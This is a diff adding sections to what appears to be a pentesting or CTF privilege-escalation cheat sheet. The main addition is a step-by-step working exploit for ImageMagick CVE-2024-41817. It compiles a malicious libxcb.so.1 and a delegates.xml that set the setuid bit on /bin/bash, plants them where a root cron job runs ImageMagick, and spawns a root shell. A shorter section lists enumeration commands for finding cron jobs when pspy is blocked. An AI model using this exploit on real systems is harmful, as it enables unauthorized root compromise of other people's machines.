@@ -2088,6 +2088,93 @@ bash -p
 - `-b` - Run backup (triggers pre_exec_commands)
 - `-f` - Force backup even if recent backup exists
 
+### ImageMagick CVE-2024-41817 - Arbitrary Code Execution
+
+ImageMagick versions <= 7.1.1-35 are vulnerable to arbitrary code execution via malicious XML delegation when run from a directory containing attacker-controlled files.
+
+**Detection:**
+
+```bash
+/usr/bin/magick -version
+# Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64
+```
+
+**Vulnerability:** ImageMagick uses empty path in `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH`, loading config/libraries from current working directory.
+
+**Exploitation:**
+
+1. Create malicious shared library:
+
+```bash
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("chmod +s /bin/bash");
+    exit(0);
+}
+EOF
+```
+
+2. Create malicious delegates.xml (optional, for command execution):
+
+```xml
+<delegatemap>
+  <delegate xmlns="" decode="XML" command="chmod +s /bin/bash"/>
+</delegatemap>
+```
+
+3. Place files where ImageMagick will be executed (e.g., cron job directory):
+
+```bash
+# Example: cron runs "magick identify" on images in /opt/app/images/
+cp libxcb.so.1 /opt/app/images/
+cp delegates.xml /opt/app/images/
+```
+
+4. Wait for cron execution or trigger manually, then:
+
+```bash
+/bin/bash -p
+# euid=0(root)
+```
+
+**Important:** Library MUST be named `libxcb.so.1` (not `libxcb.so`).
+
+**Reference:** https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
+
+---
+
+### pspy Limitations - hidepid Mount Option
+
+If pspy cannot see root processes, check if `/proc` is mounted with `hidepid`:
+
+```bash
+mount | grep "/proc "
+# proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=invisible)
+```
+
+When `hidepid=invisible` is set, users can only see their own processes. In this case:
+- pspy will NOT show root cron jobs
+- Must manually search for scheduled tasks:
+
+```bash
+# Find shell scripts
+find / -type f -name "*.sh" 2>/dev/null | grep -v "/usr/src"
+
+# Check crontabs
+cat /etc/crontab
+ls -la /etc/cron.d/
+cat /var/spool/cron/crontabs/*
+
+# Check systemd timers
+systemctl list-timers --all
+```
+
+---
+
 ### Crontab-UI Privilege Escalation
 
 Crontab-UI is a web-based cron job manager. If running as root, you can create privileged cron jobs.
